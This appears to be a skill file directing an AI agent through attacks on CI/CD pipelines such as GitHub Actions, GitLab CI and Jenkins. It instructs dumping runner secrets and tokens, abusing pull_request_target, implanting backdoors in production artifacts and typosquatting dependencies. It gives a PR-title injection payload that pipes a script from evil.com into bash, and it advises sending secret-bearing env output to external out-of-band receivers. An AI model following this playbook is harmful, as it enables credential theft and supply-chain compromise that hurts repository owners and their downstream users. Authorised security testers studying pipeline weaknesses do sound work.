---
name: cicd-technique
description: "CI/CD supply chain methodology: identifying poisoned pipelines, unsafe GitHub Actions, and extracting build secrets."
---

# cicd-technique

**Goal**: Exploit CI/CD pipelines (GitHub Actions, GitLab CI, Jenkins) to achieve code execution in runners, extract pipeline secrets, or backdoor production artifacts.

## When this technique applies
- Evaluating a repository for supply chain vulnerabilities.
- Gained access to a repository with write permissions to Pull Requests, Issues, or Wiki.
- Compromised a CI/CD runner container.

## The Execution Workflow

### 1. Runner Context Enumeration
If you achieved execution within a pipeline step (e.g., via Poisoned PR):
- **Dump secrets**: Run `env`, search for `AWS_ACCESS_KEY_ID`, `GITHUB_TOKEN`, or `$NPM_TOKEN`.
- **Identity**: For GitHub, investigate `ACTIONS_ID_TOKEN_REQUEST_URL` for OIDC (OpenID Connect) trust to AWS/GCP/Azure.

### 2. Identifying Injection Vectors
Review the pipeline configuration files (`.github/workflows/*.yml`, `.gitlab-ci.yml`, `Jenkinsfile`).
- **Untrusted Input in Scripts**: Look for `run:` blocks that echo/execute issues names, PR titles, or commit messages without sanitization:
  ```yaml
  - run: echo "Checking PR title: ${{ github.event.pull_request.title }}"
  ```
  *(A PR titled `"; curl http://evil.com/shell.sh | bash; "` will execute).*
- **`pull_request_target` Abuse**: Workflows using `pull_request_target` run with elevated repository permissions. If they check out untrusted PR code and run `npm install` or `make`, the attacker obtains high-privileged execution.

### 3. Pipeline Poisoning (Artifacts)
- Identify if the pipeline builds the production Docker image or binaries.
- If you can push code or control dependencies (e.g., typosquatting `package.json`), you can implant backdoors natively into the production deployment cycle.

## Quality Gates
- **Beware of Production Impact**: Do not blindly merge poisoned Pull Requests into main. Injecting shellcode into a build pipeline will trigger incident response or deploy malware to live customers. Keep proofs restricted to harmless `env | grep` outputs sent to external burp collaborators or out-of-band receivers.
- **Avoid Credential Rolling**: Only read CI/CD secrets. Do NOT rotate or regenerate them, as it will break the production pipeline completely.
